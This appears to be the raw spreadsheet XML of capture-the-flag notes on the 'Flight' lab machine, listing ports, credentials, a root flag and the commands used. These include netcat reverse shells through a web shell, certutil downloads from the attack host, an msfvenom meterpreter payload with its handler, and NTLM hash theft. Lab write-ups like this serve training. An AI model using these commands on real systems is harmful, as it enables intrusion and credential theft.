    <t>root.txt: caaf7d5eae09bc3d2f101c1b1533bc7a</t>
  </si>
  <si>
    <t>nt authority\system</t>
  </si>
  <si>
    <t>Admin via psexec.py.</t>
  </si>
  <si>
    <t>[victim IP]</t>
  </si>
  <si>
    <t>sudo masscan -pT:1-65535,U:1-65535 --rate=1000 -e tun0 [victim IP] &gt; raw_ports.txt</t>
  </si>
  <si>
    <t>sudo nmap -p$(cat raw_ports.txt | cut -d ' ' -f 4 | cut -d '/' -f 1 | sort -un | tr '\n' ',' | sed 's/,$//') -sS -sV --version-all -sC -O -T3 -v [victim IP]</t>
  </si>
  <si>
    <t>netexec smb [victim IP] --generate-hosts-file hosts</t>
  </si>
  <si>
    <t>netexec smb [victim IP]  -u '' -p '' --shares</t>
  </si>
  <si>
    <t>netexec smb [victim IP] -u 'null' -p '' --shares</t>
  </si>
  <si>
    <t xml:space="preserve">sudo nmap -p53 -sU -sV --version-all -sC -O -T1 -v [victim IP]  </t>
  </si>
  <si>
    <t>enum4linux -a [victim IP]</t>
  </si>
  <si>
    <t>netexec smb [victim IP] -u 'svc_apache' -p 'S@Ss!K@*t13' --shares</t>
  </si>
  <si>
    <t>psexec flight.htb/svc_apache:'S@Ss!K@*t13'@[victim IP]</t>
  </si>
  <si>
    <t>nxc smb [victim IP] -u 'svc_apache' -p 'S@Ss!K@*t13' -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=./smb_download</t>
  </si>
  <si>
    <t>smbclient //[victim IP]/ShareName -U 'svc_apache%S@Ss!K@*t13' -c 'recurse ON; prompt OFF; mget *'</t>
  </si>
  <si>
    <t>GetNPUsers.py flight.htb/c.bum -dc-ip [victim IP] -no-pass -request -format john</t>
  </si>
  <si>
    <t>enum4linux -a -u 'svc_apache' -p 'S@Ss!K@*t13' [victim IP]</t>
  </si>
  <si>
    <t>GetNPUsers.py flight.htb/ -usersfile "new_users.txt" -dc-ip [victim IP] -request -format john</t>
  </si>
  <si>
    <t xml:space="preserve">netexec smb [victim IP] -u new_users.txt -p 'S@Ss!K@*t13' </t>
  </si>
  <si>
    <t xml:space="preserve">netexec smb [victim IP] -u svc_apache -p 'S@Ss!K@*t13' --users </t>
  </si>
  <si>
    <t>/index.php?view=http://[attack IP]:8000/raw_ports.txt</t>
  </si>
  <si>
    <t>python ntlm_theft.py -g all -s [attack IP] -f null</t>
  </si>
  <si>
    <t>curl -G http://school.flight.htb/styles/simpleshell.php --data-urlencode 'cmd=nc.exe -e cmd.exe [attack IP] 4444'</t>
  </si>
  <si>
    <t>certutil -urlcache -split -f http://[attack IP]:8080/winPEASx86.exe winPEASx86.exe</t>
  </si>
  <si>
    <t>.\RunasCs.exe C.Bum Tikkycoll_431012284 -r [attack IP]:443 cmd</t>
  </si>
  <si>
    <t>certutil -urlcache -split -f http://[attack IP]:8080/RunasCs.exe RunasCs.exe</t>
  </si>
  <si>
    <t>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[attack IP] LPORT=5555 -a x64 --platform windows -f exe &gt; mal.exe</t>
  </si>
  <si>
    <t>use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST [attack IP]
set LPORT 5555
exploit</t>
  </si>
  <si>
    <t>.\chisel.exe client [attack IP]:9000 R:9999:127.0.0.1:8000</t>
  </si>
  <si>
    <t>/c \inetpub\development\nc.exe -e cmd [attack IP] 5555</t>
  </si>
  <si>
    <t>certutil -urlcache -split -f http://[attack IP]:8080/Rubeus.exe Rubeus.exe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</si>
</sst>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
      <b/>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2" fillId="0" borderId="0" xfId="1" applyAlignment="1">
      <alignment horizontal="left" vertical="top" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="4" fillId="0" borderId="0" xfId="0" applyFont="1" applyAlignment="1">
      <alignment horizontal="left" vertical="top" wrapText="1"/>
    </xf>
    <xf numFmtId="2" fontId="4" fillId="0" borderId="0" xfId="0" applyNumberFormat="1" applyFont="1" applyAlignment="1">
      <alignment horizontal="left" vertical="top" wrapText="1"/>
    </xf>
    <xf numFmtId="2" fontId="5" fillId="0" borderId="0" xfId="0" applyNumberFormat="1" applyFont="1" applyAlignment="1">
      <alignment horizontal="left" vertical="top" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0" applyAlignment="1">
      <alignment vertical="top"/>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wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="2" fillId="0" borderId="0" xfId="1" applyAlignment="1">
      <alignment vertical="top" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0" applyFont="1" applyAlignment="1">
      <alignment horizontal="left" vertical="top" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="2" fillId="0" borderId="0" xfId="1" applyFont="1" applyAlignment="1">
      <alignment horizontal="left" vertical="top" wrapText="1"/>
    </xf>
  </cellXfs>
  <cellStyles count="2">
    <cellStyle name="Hyperlink" xfId="1" builtinId="8"/>
    <cellStyle name="Normal" xfId="0" builtinId="0"/>
  </cellStyles>
  <dxfs count="2">
    <dxf>
      <fill>
        <patternFill>
          <bgColor theme="6" tint="0.39994506668294322"/>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hool.flight.htb/"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antonioCoco/RunasCs" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/" TargetMode="External"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://thewireshark.com/2025/02/gobuster-directory-brute-force/" TargetMode="External"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/printerSettings" Target="../printerSettings/printerSettings4.bin"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://blog.geekinstitute.org/2025/05/gaining-access-to-windows-system-using-msfvenom-and-metasploit.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osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashe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C755-4FE5-4C70-ABDC-86E8ABD7F626}">
  <dimension ref="A1:K36"/>
  <sheetViews>
    <sheetView tabSelected="1" zoomScale="75" zoomScaleNormal="75" workbookViewId="0">
      <pane ySplit="1" topLeftCell="A2" activePane="bottomLeft" state="frozen"/>
      <selection activeCell="E1" sqref="E1"/>
      <selection pane="bottomLeft" activeCell="G27" sqref="G27"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultColWidth="15.77734375" defaultRowHeight="15" customHeight="1" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="1" width="18.6640625" style="2" customWidth="1"/>
    <col min="2" max="6" width="15.77734375" style="2"/>
    <col min="7" max="7" width="23.5546875" style="2" customWidth="1"/>
    <col min="8" max="8" width="35.44140625" style="2" customWidth="1"/>
    <col min="9" max="9" width="23.44140625" style="2" customWidth="1"/>
    <col min="10" max="10" width="36.6640625" style="2" customWidth="1"/>
    <col min="11" max="11" width="36.88671875" style="2" customWidth="1"/>
    <col min="12" max="16384" width="15.77734375" style="2"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:11" s="4" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A1" s="4" t="s">
        <v>0</v>
      </c>
      <c r="B1" s="4" t="s">
        <v>15</v>
      </c>
      <c r="C1" s="4" t="s">
        <v>1</v>
      </c>
      <c r="D1" s="4" t="s">
        <v>18</v>
      </c>
      <c r="E1" s="4" t="s">
        <v>2</v>
      </c>
      <c r="F1" s="4" t="s">
        <v>3</v>
      </c>
      <c r="G1" s="4" t="s">
        <v>4</v>
      </c>
      <c r="H1" s="4" t="s">
        <v>5</v>
      </c>
      <c r="I1" s="4" t="s">
        <v>21</v>
      </c>
      <c r="J1" s="4" t="s">
        <v>10</v>
      </c>
      <c r="K1" s="4" t="s">
        <v>9</v>
      </c>
    </row>
    <row r="2" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A2" s="2" t="s">
        <v>150</v>
      </c>
      <c r="B2" s="2" t="s">
        <v>82</v>
      </c>
      <c r="C2" s="2" t="s">
        <v>101</v>
      </c>
      <c r="D2" s="2" t="s">
        <v>41</v>
      </c>
      <c r="E2" s="7" t="str">
        <f t="shared" ref="E2:E20" si="0">LEFT($D2,FIND("/",$D2)-1)</f>
        <v>53</v>
      </c>
      <c r="F2" s="6" t="str">
        <f t="shared" ref="F2:F20" si="1">MID($D2,FIND("/",$D2)+1,LEN($D2))</f>
        <v>tcp</v>
      </c>
      <c r="G2" s="2" t="s">
        <v>47</v>
      </c>
    </row>
    <row r="3" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A3" s="2" t="s">
        <v>150</v>
      </c>
      <c r="B3" s="2" t="s">
        <v>83</v>
      </c>
      <c r="C3" s="2" t="s">
        <v>101</v>
      </c>
      <c r="D3" s="2" t="s">
        <v>24</v>
      </c>
      <c r="E3" s="8" t="str">
        <f t="shared" si="0"/>
        <v>80</v>
      </c>
      <c r="F3" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G3" s="2" t="s">
        <v>48</v>
      </c>
      <c r="H3" s="2" t="s">
        <v>67</v>
      </c>
      <c r="I3" s="2" t="s">
        <v>74</v>
      </c>
      <c r="J3" s="5"/>
    </row>
    <row r="4" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A4" s="2" t="s">
        <v>150</v>
      </c>
      <c r="B4" s="2" t="s">
        <v>84</v>
      </c>
      <c r="C4" s="2" t="s">
        <v>101</v>
      </c>
      <c r="D4" s="2" t="s">
        <v>38</v>
      </c>
      <c r="E4" s="7" t="str">
        <f t="shared" si="0"/>
        <v>88</v>
      </c>
      <c r="F4" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G4" s="2" t="s">
        <v>49</v>
      </c>
      <c r="I4" s="4"/>
      <c r="J4" s="5"/>
    </row>
    <row r="5" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A5" s="2" t="s">
        <v>150</v>
      </c>
      <c r="B5" s="2" t="s">
        <v>85</v>
      </c>
      <c r="C5" s="2" t="s">
        <v>101</v>
      </c>
      <c r="D5" s="2" t="s">
        <v>29</v>
      </c>
      <c r="E5" s="7" t="str">
        <f t="shared" si="0"/>
        <v>135</v>
      </c>
      <c r="F5" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G5" s="2" t="s">
        <v>50</v>
      </c>
      <c r="I5" s="4"/>
      <c r="J5" s="5"/>
    </row>
    <row r="6" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A6" s="2" t="s">
        <v>150</v>
      </c>
      <c r="B6" s="2" t="s">
        <v>86</v>
      </c>
      <c r="C6" s="2" t="s">
        <v>101</v>
      </c>
      <c r="D6" s="2" t="s">
        <v>37</v>
      </c>
      <c r="E6" s="7" t="str">
        <f t="shared" si="0"/>
        <v>139</v>
      </c>
      <c r="F6" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G6" s="2" t="s">
        <v>51</v>
      </c>
      <c r="H6" s="4"/>
      <c r="I6" s="4"/>
      <c r="J6" s="5"/>
    </row>
    <row r="7" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A7" s="2" t="s">
        <v>150</v>
      </c>
      <c r="B7" s="2" t="s">
        <v>87</v>
      </c>
      <c r="C7" s="2" t="s">
        <v>101</v>
      </c>
      <c r="D7" s="2" t="s">
        <v>31</v>
      </c>
      <c r="E7" s="7" t="str">
        <f t="shared" si="0"/>
        <v>389</v>
      </c>
      <c r="F7" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G7" s="2" t="s">
        <v>52</v>
      </c>
      <c r="H7" s="4"/>
      <c r="J7" s="5"/>
    </row>
    <row r="8" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A8" s="2" t="s">
        <v>150</v>
      </c>
      <c r="B8" s="2" t="s">
        <v>88</v>
      </c>
      <c r="C8" s="2" t="s">
        <v>101</v>
      </c>
      <c r="D8" s="2" t="s">
        <v>28</v>
      </c>
      <c r="E8" s="8" t="str">
        <f t="shared" si="0"/>
        <v>445</v>
      </c>
      <c r="F8" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G8" s="2" t="s">
        <v>53</v>
      </c>
      <c r="H8" s="2" t="s">
        <v>108</v>
      </c>
      <c r="I8" s="4" t="s">
        <v>109</v>
      </c>
    </row>
    <row r="9" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A9" s="2" t="s">
        <v>150</v>
      </c>
      <c r="B9" s="2" t="s">
        <v>89</v>
      </c>
      <c r="C9" s="2" t="s">
        <v>101</v>
      </c>
      <c r="D9" s="2" t="s">
        <v>42</v>
      </c>
      <c r="E9" s="7" t="str">
        <f t="shared" si="0"/>
        <v>464</v>
      </c>
      <c r="F9" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G9" s="2" t="s">
        <v>54</v>
      </c>
    </row>
    <row r="10" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A10" s="2" t="s">
        <v>150</v>
      </c>
      <c r="B10" s="2" t="s">
        <v>90</v>
      </c>
      <c r="C10" s="2" t="s">
        <v>101</v>
      </c>
      <c r="D10" s="2" t="s">
        <v>33</v>
      </c>
      <c r="E10" s="7" t="str">
        <f t="shared" si="0"/>
        <v>593</v>
      </c>
      <c r="F10" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G10" s="2" t="s">
        <v>55</v>
      </c>
      <c r="J10" s="5"/>
    </row>
    <row r="11" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A11" s="2" t="s">
        <v>150</v>
      </c>
      <c r="B11" s="2" t="s">
        <v>91</v>
      </c>
      <c r="C11" s="2" t="s">
        <v>101</v>
      </c>
      <c r="D11" s="2" t="s">
        <v>45</v>
      </c>
      <c r="E11" s="7" t="str">
        <f t="shared" si="0"/>
        <v>636</v>
      </c>
      <c r="F11" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G11" s="2" t="s">
        <v>56</v>
      </c>
    </row>
    <row r="12" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A12" s="2" t="s">
        <v>150</v>
      </c>
      <c r="B12" s="2" t="s">
        <v>92</v>
      </c>
      <c r="C12" s="2" t="s">
        <v>101</v>
      </c>
      <c r="D12" s="2" t="s">
        <v>46</v>
      </c>
      <c r="E12" s="7" t="str">
        <f t="shared" si="0"/>
        <v>3268</v>
      </c>
      <c r="F12" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G12" s="4" t="s">
        <v>57</v>
      </c>
    </row>
    <row r="13" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A13" s="2" t="s">
        <v>150</v>
      </c>
      <c r="B13" s="2" t="s">
        <v>93</v>
      </c>
      <c r="C13" s="2" t="s">
        <v>101</v>
      </c>
      <c r="D13" s="2" t="s">
        <v>32</v>
      </c>
      <c r="E13" s="7" t="str">
        <f t="shared" si="0"/>
        <v>3269</v>
      </c>
      <c r="F13" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G13" s="4" t="s">
        <v>58</v>
      </c>
    </row>
    <row r="14" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A14" s="2" t="s">
        <v>150</v>
      </c>
      <c r="B14" s="2" t="s">
        <v>94</v>
      </c>
      <c r="C14" s="2" t="s">
        <v>101</v>
      </c>
      <c r="D14" s="2" t="s">
        <v>34</v>
      </c>
      <c r="E14" s="7" t="str">
        <f t="shared" si="0"/>
        <v>9389</v>
      </c>
      <c r="F14" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G14" s="2" t="s">
        <v>59</v>
      </c>
    </row>
    <row r="15" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A15" s="2" t="s">
        <v>150</v>
      </c>
      <c r="B15" s="2" t="s">
        <v>95</v>
      </c>
      <c r="C15" s="2" t="s">
        <v>101</v>
      </c>
      <c r="D15" s="2" t="s">
        <v>35</v>
      </c>
      <c r="E15" s="7" t="str">
        <f t="shared" si="0"/>
        <v>49667</v>
      </c>
      <c r="F15" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G15" s="2" t="s">
        <v>60</v>
      </c>
      <c r="J15" s="5"/>
    </row>
    <row r="16" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A16" s="2" t="s">
        <v>150</v>
      </c>
      <c r="B16" s="2" t="s">
        <v>96</v>
      </c>
      <c r="C16" s="2" t="s">
        <v>101</v>
      </c>
      <c r="D16" s="2" t="s">
        <v>36</v>
      </c>
      <c r="E16" s="7" t="str">
        <f t="shared" si="0"/>
        <v>49673</v>
      </c>
      <c r="F16" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G16" s="2" t="s">
        <v>61</v>
      </c>
    </row>
    <row r="17" spans="1:10" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A17" s="2" t="s">
        <v>150</v>
      </c>
      <c r="B17" s="2" t="s">
        <v>97</v>
      </c>
      <c r="C17" s="2" t="s">
        <v>101</v>
      </c>
      <c r="D17" s="2" t="s">
        <v>40</v>
      </c>
      <c r="E17" s="7" t="str">
        <f t="shared" si="0"/>
        <v>49674</v>
      </c>
      <c r="F17" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G17" s="2" t="s">
        <v>62</v>
      </c>
      <c r="J17" s="5"/>
    </row>
    <row r="18" spans="1:10" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A18" s="2" t="s">
        <v>150</v>
      </c>
      <c r="B18" s="2" t="s">
        <v>98</v>
      </c>
      <c r="C18" s="2" t="s">
        <v>101</v>
      </c>
      <c r="D18" s="2" t="s">
        <v>39</v>
      </c>
      <c r="E18" s="7" t="str">
        <f t="shared" si="0"/>
        <v>49684</v>
      </c>
      <c r="F18" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G18" s="2" t="s">
        <v>63</v>
      </c>
      <c r="H18" s="4"/>
    </row>
    <row r="19" spans="1:10" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A19" s="2" t="s">
        <v>150</v>
      </c>
      <c r="B19" s="2" t="s">
        <v>99</v>
      </c>
      <c r="C19" s="2" t="s">
        <v>101</v>
      </c>
      <c r="D19" s="2" t="s">
        <v>43</v>
      </c>
      <c r="E19" s="7" t="str">
        <f t="shared" si="0"/>
        <v>49692</v>
      </c>
      <c r="F19" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G19" s="2" t="s">
        <v>64</v>
      </c>
    </row>
    <row r="20" spans="1:10" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A20" s="2" t="s">
        <v>150</v>
      </c>
      <c r="B20" s="2" t="s">
        <v>100</v>
      </c>
      <c r="C20" s="2" t="s">
        <v>101</v>
      </c>
      <c r="D20" s="2" t="s">
        <v>44</v>
      </c>
      <c r="E20" s="7" t="str">
        <f t="shared" si="0"/>
        <v>53</v>
      </c>
      <c r="F20" s="6" t="str">
        <f t="shared" si="1"/>
        <v>udp</v>
      </c>
      <c r="G20" s="2" t="s">
        <v>69</v>
      </c>
    </row>
    <row r="21" spans="1:10" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E21" s="7"/>
      <c r="F21" s="6"/>
    </row>
    <row r="22" spans="1:10" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E22" s="7"/>
      <c r="F22" s="6"/>
    </row>
    <row r="23" spans="1:10" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E23" s="7"/>
      <c r="F23" s="6"/>
      <c r="I23" s="4"/>
      <c r="J23" s="5"/>
    </row>
    <row r="24" spans="1:10" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E24" s="7"/>
      <c r="F24" s="6"/>
    </row>
    <row r="25" spans="1:10" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E25" s="7"/>
      <c r="F25" s="6"/>
    </row>
    <row r="26" spans="1:10" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="F26" s="6"/>
    </row>
    <row r="27" spans="1:10" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="F27" s="6"/>
    </row>
    <row r="28" spans="1:10" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="F28" s="6"/>
    </row>
    <row r="29" spans="1:10" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="F29" s="6"/>
    </row>
    <row r="30" spans="1:10" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="F30" s="6"/>
    </row>
    <row r="31" spans="1:10" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="F31" s="6"/>
    </row>
    <row r="32" spans="1:10" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="F32" s="6"/>
    </row>
    <row r="33" spans="6:6" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="F33" s="6"/>
    </row>
    <row r="34" spans="6:6" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="F34" s="6"/>
    </row>
    <row r="35" spans="6:6" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="F35" s="6"/>
    </row>
    <row r="36" spans="6:6" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="F36" s="6"/>
    </row>
  </sheetData>
  <sortState xmlns:xlrd2="http://schemas.microsoft.com/office/spreadsheetml/2017/richdata2" ref="A2:K25">
    <sortCondition ref="F2:F25"/>
    <sortCondition ref="E2:E25"/>
  </sortState>
  <phoneticPr fontId="3" type="noConversion"/>
  <conditionalFormatting sqref="F2:F36">
    <cfRule type="cellIs" dxfId="1" priority="1" operator="equal">
      <formula>"udp"</formula>
    </cfRule>
    <cfRule type="cellIs" dxfId="0" priority="2" operator="equal">
      <formula>"tcp"</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B5CB-E7C9-4655-B0CB-02AE97F3D2B4}">
  <dimension ref="A1:I22"/>
  <sheetViews>
    <sheetView zoomScale="78" zoomScaleNormal="78" workbookViewId="0">
      <pane ySplit="1" topLeftCell="A2" activePane="bottomLeft" state="frozen"/>
      <selection activeCell="C1" sqref="C1"/>
      <selection pane="bottomLeft" activeCell="F13" sqref="F13"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultColWidth="15.77734375" defaultRowHeight="15" customHeight="1" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="1" width="38.44140625" style="2" bestFit="1" customWidth="1"/>
    <col min="2" max="2" width="13.109375" style="2" customWidth="1"/>
    <col min="3" max="4" width="15.77734375" style="2"/>
    <col min="5" max="5" width="39.5546875" style="2" customWidth="1"/>
    <col min="6" max="6" width="107.6640625" style="2" customWidth="1"/>
    <col min="7" max="7" width="30.5546875" style="2" customWidth="1"/>
    <col min="8" max="8" width="15.77734375" style="2"/>
    <col min="9" max="9" width="45.5546875" style="2" customWidth="1"/>
    <col min="10" max="16384" width="15.77734375" style="2"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:9" s="4" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A1" s="4" t="s">
        <v>7</v>
      </c>
      <c r="B1" s="4" t="s">
        <v>2</v>
      </c>
      <c r="C1" s="4" t="s">
        <v>17</v>
      </c>
      <c r="D1" s="4" t="s">
        <v>16</v>
      </c>
      <c r="E1" s="4" t="s">
        <v>8</v>
      </c>
      <c r="F1" s="4" t="s">
        <v>5</v>
      </c>
      <c r="G1" s="4" t="s">
        <v>21</v>
      </c>
      <c r="H1" s="4" t="s">
        <v>10</v>
      </c>
      <c r="I1" s="4" t="s">
        <v>9</v>
      </c>
    </row>
    <row r="2" spans="1:9" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A2" s="5" t="s">
        <v>77</v>
      </c>
      <c r="B2" s="1">
        <v>80</v>
      </c>
      <c r="D2" s="2">
        <v>200</v>
      </c>
      <c r="E2" s="2" t="s">
        <v>167</v>
      </c>
      <c r="F2" s="2" t="s">
        <v>81</v>
      </c>
      <c r="G2" s="2" t="s">
        <v>80</v>
      </c>
    </row>
    <row r="3" spans="1:9" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A3" s="1"/>
      <c r="B3" s="1"/>
      <c r="H3" s="5"/>
    </row>
    <row r="4" spans="1:9" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="H4" s="5"/>
    </row>
    <row r="5" spans="1:9" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A5" s="1"/>
    </row>
    <row r="6" spans="1:9" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A6" s="1"/>
    </row>
    <row r="7" spans="1:9" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A7" s="1"/>
    </row>
    <row r="8" spans="1:9" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A8" s="1"/>
      <c r="B8" s="1"/>
      <c r="G8" s="5"/>
    </row>
    <row r="9" spans="1:9" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E9" s="4"/>
    </row>
    <row r="10" spans="1:9" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E10" s="4"/>
    </row>
    <row r="11" spans="1:9" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E11" s="4"/>
    </row>
    <row r="12" spans="1:9" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E12" s="4"/>
    </row>
    <row r="13" spans="1:9" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E13" s="4"/>
    </row>
    <row r="22" spans="8:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="H22" s="5"/>
    </row>
  </sheetData>
  <phoneticPr fontId="3" type="noConversion"/>
  <hyperlinks>
    <hyperlink ref="A2" r:id="rId1" xr:uid="{58A3AFFF-1CF2-4C15-BA3C-195F85192245}"/>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E3C73-22A5-4008-8739-F489AE5D585F}">
  <dimension ref="A1:K5"/>
  <sheetViews>
    <sheetView zoomScale="75" zoomScaleNormal="75" workbookViewId="0">
      <pane ySplit="1" topLeftCell="A2" activePane="bottomLeft" state="frozen"/>
      <selection activeCell="B1" sqref="B1"/>
      <selection pane="bottomLeft" activeCell="J9" sqref="J9"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultColWidth="15.77734375" defaultRowHeight="15" customHeight="1" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="4" width="15.77734375" style="12"/>
    <col min="5" max="5" width="30.109375" style="12" customWidth="1"/>
    <col min="6" max="7" width="15.77734375" style="12"/>
    <col min="8" max="8" width="47.88671875" style="12" customWidth="1"/>
    <col min="9" max="9" width="18.44140625" style="12" customWidth="1"/>
    <col min="10" max="10" width="55.88671875" style="12" customWidth="1"/>
    <col min="11" max="11" width="38.44140625" style="12" customWidth="1"/>
    <col min="12" max="16384" width="15.77734375" style="12"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:11" s="10" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A1" s="10" t="s">
        <v>11</v>
      </c>
      <c r="B1" s="10" t="s">
        <v>4</v>
      </c>
      <c r="C1" s="10" t="s">
        <v>2</v>
      </c>
      <c r="D1" s="10" t="s">
        <v>3</v>
      </c>
      <c r="E1" s="10" t="s">
        <v>12</v>
      </c>
      <c r="F1" s="10" t="s">
        <v>13</v>
      </c>
      <c r="G1" s="10" t="s">
        <v>14</v>
      </c>
      <c r="H1" s="10" t="s">
        <v>5</v>
      </c>
      <c r="I1" s="10" t="s">
        <v>10</v>
      </c>
      <c r="J1" s="11" t="s">
        <v>21</v>
      </c>
      <c r="K1" s="10" t="s">
        <v>9</v>
      </c>
    </row>
    <row r="2" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A2" s="9" t="s">
        <v>150</v>
      </c>
      <c r="E2" s="12" t="s">
        <v>113</v>
      </c>
      <c r="H2" s="12" t="s">
        <v>124</v>
      </c>
      <c r="I2" s="13"/>
      <c r="J2" s="12" t="s">
        <v>116</v>
      </c>
    </row>
    <row r="3" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A3" s="9" t="s">
        <v>150</v>
      </c>
      <c r="E3" s="9" t="s">
        <v>122</v>
      </c>
      <c r="F3" s="12" t="s">
        <v>126</v>
      </c>
      <c r="G3" s="12" t="s">
        <v>125</v>
      </c>
      <c r="H3" s="12" t="s">
        <v>134</v>
      </c>
      <c r="I3" s="13"/>
      <c r="J3" s="10" t="s">
        <v>123</v>
      </c>
    </row>
    <row r="4" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A4" s="9" t="s">
        <v>150</v>
      </c>
      <c r="E4" s="12" t="s">
        <v>136</v>
      </c>
      <c r="H4" s="12" t="s">
        <v>146</v>
      </c>
      <c r="J4" s="12" t="s">
        <v>138</v>
      </c>
    </row>
    <row r="5" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A5" s="9" t="s">
        <v>150</v>
      </c>
